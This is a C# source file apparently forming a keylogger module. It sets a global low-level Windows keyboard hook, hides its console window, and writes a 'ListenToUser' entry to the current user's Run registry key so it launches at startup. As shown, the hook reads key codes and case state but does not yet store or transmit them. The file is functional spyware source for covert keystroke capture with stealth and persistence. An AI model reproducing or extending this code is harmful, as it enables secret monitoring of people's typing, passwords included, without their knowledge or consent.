using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Net.Mime.MediaTypeNames;
namespace HNBackend.Module.TCaptureScreen
{
    public class THookKeyBoard
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                {
                    bool isCaplock = System.Windows.Forms.Control.IsKeyLocked(System.Windows.Forms.Keys.CapsLock);
                    bool isShiftKeyPressed = Control.ModifierKeys == Keys.Shift;

                    bool isToUpper = false;
                    if (isCaplock || isShiftKeyPressed)
                        isToUpper = true;

                    int vkCode = Marshal.ReadInt32(lParam);
                }

                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        public static void HookKeyboard()
        {
            try
            {
                _hookID = SetHook(_proc);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public static void WindowsHook()
        {
            try
            {
                UnhookWindowsHookEx(_hookID);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public static void HideWindow()
        {
            try
            {
                IntPtr console = GetConsoleWindow();
                ShowWindow(console, SW_HIDE);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public static void StartWithOS(string pathApp)
        {
            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\ListenToUser");
            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            string keyvalue = "1";
            try
            {
                regkey.SetValue("Index", keyvalue);
                regstart.SetValue("ListenToUser", pathApp);
                regkey.Close();
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }
    }
}
